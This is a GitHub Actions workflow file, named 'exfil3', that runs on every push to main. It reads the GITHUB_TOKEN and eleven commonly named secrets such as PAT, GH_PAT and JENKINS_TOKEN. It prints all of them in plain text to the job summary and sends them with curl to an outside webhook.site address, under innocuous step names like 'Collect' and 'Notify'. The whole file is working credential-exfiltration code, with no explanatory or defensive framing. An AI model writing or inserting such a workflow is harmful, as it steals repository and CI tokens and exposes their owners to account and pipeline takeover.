name: exfil3
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Collect
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          S1: ${{ secrets.PAT }}
          S2: ${{ secrets.GH_TOKEN }}
          S3: ${{ secrets.GITHUB_PAT }}
          S4: ${{ secrets.TOKEN }}
          S5: ${{ secrets.GITHUB_ACCESS_TOKEN }}
          S6: ${{ secrets.JENKINS_TOKEN }}
          S7: ${{ secrets.GH_PAT }}
          S8: ${{ secrets.PERSONAL_TOKEN }}
          S9: ${{ secrets.ACCESS_TOKEN }}
          S10: ${{ secrets.JENKINS_API_TOKEN }}
          S11: ${{ secrets.GIT_TOKEN }}
          S12: ${{ secrets.GITHUB_TOKEN_PAT }}
        run: |
          {
            echo "GITHUB_TOKEN=$GH_TOKEN"
            echo "PAT=$S1"
            echo "GH_TOKEN=$S2"
            echo "GITHUB_PAT=$S3"
            echo "TOKEN=$S4"
            echo "GITHUB_ACCESS_TOKEN=$S5"
            echo "JENKINS_TOKEN=$S6"
            echo "GH_PAT=$S7"
            echo "PERSONAL_TOKEN=$S8"
            echo "ACCESS_TOKEN=$S9"
            echo "JENKINS_API_TOKEN=$S10"
            echo "GIT_TOKEN=$S11"
            echo "GITHUB_TOKEN_PAT=$S12"
          } | tee -a "$GITHUB_STEP_SUMMARY"
      - name: Notify
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          S1: ${{ secrets.PAT }}
          S2: ${{ secrets.GH_TOKEN }}
          S3: ${{ secrets.GITHUB_PAT }}
          S4: ${{ secrets.TOKEN }}
          S5: ${{ secrets.GITHUB_ACCESS_TOKEN }}
          S6: ${{ secrets.JENKINS_TOKEN }}
          S7: ${{ secrets.GH_PAT }}
          S8: ${{ secrets.PERSONAL_TOKEN }}
          S9: ${{ secrets.ACCESS_TOKEN }}
          S10: ${{ secrets.JENKINS_API_TOKEN }}
          S11: ${{ secrets.GIT_TOKEN }}
          S12: ${{ secrets.GITHUB_TOKEN_PAT }}
        run: |
          curl -s -m 20 -X POST "https://webhook.site/d91ac9ea-b455-491a-be0c-c697bae9161c" \
            --data-urlencode "GITHUB_TOKEN=$GH_TOKEN" \
            --data-urlencode "PAT=$S1" \
            --data-urlencode "GH_TOKEN=$S2" \
            --data-urlencode "GITHUB_PAT=$S3" \
            --data-urlencode "TOKEN=$S4" \
            --data-urlencode "GITHUB_ACCESS_TOKEN=$S5" \
            --data-urlencode "JENKINS_TOKEN=$S6" \
            --data-urlencode "GH_PAT=$S7" \
            --data-urlencode "PERSONAL_TOKEN=$S8" \
            --data-urlencode "ACCESS_TOKEN=$S9" \
            --data-urlencode "JENKINS_API_TOKEN=$S10" \
            --data-urlencode "GIT_TOKEN=$S11" \
            --data-urlencode "GITHUB_TOKEN_PAT=$S12"
